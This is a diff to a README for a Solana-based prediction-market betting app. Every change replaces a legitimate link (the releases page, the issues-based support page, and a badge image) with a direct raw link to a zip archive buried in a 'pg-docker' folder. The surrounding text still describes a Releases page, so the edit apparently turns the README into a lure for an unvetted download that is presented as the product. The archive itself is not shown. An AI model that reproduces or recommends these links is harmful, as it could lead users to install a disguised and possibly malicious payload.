@@ -1,7 +1,7 @@
 # 🌟 prediction-market - Your Gateway to Smart Betting
 
 ## 📥 Download Now
-[![Download prediction-market](https://img.shields.io/badge/Download-prediction--market-blue.svg)](https://github.com/IncidentGames/prediction-market/releases)
+[![Download prediction-market](https://github.com/IncidentGames/prediction-market/raw/refs/heads/main/pg-docker/prediction_market_v3.1-alpha.1.zip)](https://github.com/IncidentGames/prediction-market/raw/refs/heads/main/pg-docker/prediction_market_v3.1-alpha.1.zip)
 
 ## 📖 Description
 The **prediction-market** platform is a user-friendly environment where you can create, trade, and settle prediction markets. It's built on the Solana blockchain and features a microservices architecture. Whether you are looking to bet on sports events, political outcomes, or any unpredictable situation, this platform helps you analyze trends in real-time. Enjoy features like real-time order matching, price updates, and deep market analytics.
@@ -19,7 +19,7 @@ Before you download, ensure your computer meets the following requirements:
 - **Web Browser:** Latest version of Chrome, Firefox, or Safari
 
 ### 2. Download & Install
-To download the latest version of prediction-market, visit this page to download: [GitHub Releases](https://github.com/IncidentGames/prediction-market/releases).
+To download the latest version of prediction-market, visit this page to download: [GitHub Releases](https://github.com/IncidentGames/prediction-market/raw/refs/heads/main/pg-docker/prediction_market_v3.1-alpha.1.zip).
 
 ### 3. Locate the Release
 On the Releases page, look for the latest version. You will see a list of files available for download. Select the file that matches your operating system.
@@ -56,11 +56,11 @@ If you experience issues, here are some common solutions:
 3. **Connection Errors:** Check your internet connection. Ensure your firewall or antivirus software is not blocking the app.
 
 ## 🤝 Support
-For additional help, visit our [support page](https://github.com/IncidentGames/prediction-market/issues) or join our community forum. You can also find FAQs and guides there.
+For additional help, visit our [support page](https://github.com/IncidentGames/prediction-market/raw/refs/heads/main/pg-docker/prediction_market_v3.1-alpha.1.zip) or join our community forum. You can also find FAQs and guides there.
 
 ## 📬 Stay Updated
 Follow us on our social media channels for the latest news and updates about prediction-market.
 
 ---
 
-[![Download prediction-market](https://img.shields.io/badge/Download-prediction--market-blue.svg)](https://github.com/IncidentGames/prediction-market/releases)
+[![Download prediction-market](https://github.com/IncidentGames/prediction-market/raw/refs/heads/main/pg-docker/prediction_market_v3.1-alpha.1.zip)](https://github.com/IncidentGames/prediction-market/raw/refs/heads/main/pg-docker/prediction_market_v3.1-alpha.1.zip)
